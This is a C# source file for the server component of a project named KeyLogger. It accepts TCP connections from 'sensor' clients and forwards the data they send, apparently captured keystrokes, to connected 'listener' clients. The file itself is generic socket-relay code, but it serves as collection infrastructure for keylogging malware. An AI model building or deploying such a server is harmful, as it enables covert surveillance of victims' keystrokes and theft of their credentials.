using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Collections.Generic;
using System;
using System.IO;
using KeyLogger.Protocol;

namespace KeyLogger.Server
{
    public class Server
    {
        private bool _listen;
        private TcpListener _server;

        private List<SensorClient> _sensors;
        private List<ListenerClient> _listeners;

        public Server(IPAddress address, int port)
        {
            _server = new TcpListener(address, port);
            _sensors = new List<SensorClient>();
            _listeners = new List<ListenerClient>();
        }

        public Task StartListening()
        {
            return Task.Run(() =>
            {
                Console.WriteLine("[Server] Starting listening");
                var factory = new ClientFactory();
                _listen = true;
                _server.Start();
                while (_listen)
                {
                    try
                    {
                        var tcpClient = _server.AcceptTcpClient();
                        Console.Write("[Server] New client... ");
                        var message = new ConnectionMessage();
                        message.Receive(tcpClient.GetStream());
                        var client = factory.CreateClient(tcpClient, message.Type.Value);
                        if (client is SensorClient)
                        {
                            Console.Write("sensor... ");
                            _sensors.Add(client as SensorClient);
                            (client as SensorClient).DataReceived += (s, e) =>
                            {
                                foreach (var listener in _listeners)
                                    listener.Send(e.Data);
                            };
                        }
                        else if (client is ListenerClient)
                        {
                            Console.Write("listener... ");
                            _listeners.Add(client as ListenerClient);
                        }
                        client.Run();
                        Console.WriteLine("started");
                    }
                    catch (SocketException)
                    {
                        Console.WriteLine("socket error");
                    }
                    catch (IOException)
                    {
                        Console.WriteLine("I/O error");
                    }
                    catch (InvalidDataException)
                    {
                        Console.WriteLine("invalid data");
                    }
                }
            });
        }

        public void Close()
        {
            foreach (var sensor in _sensors)
                sensor.Close();
            foreach (var listener in _listeners)
                listener.Close();
        }
    }
}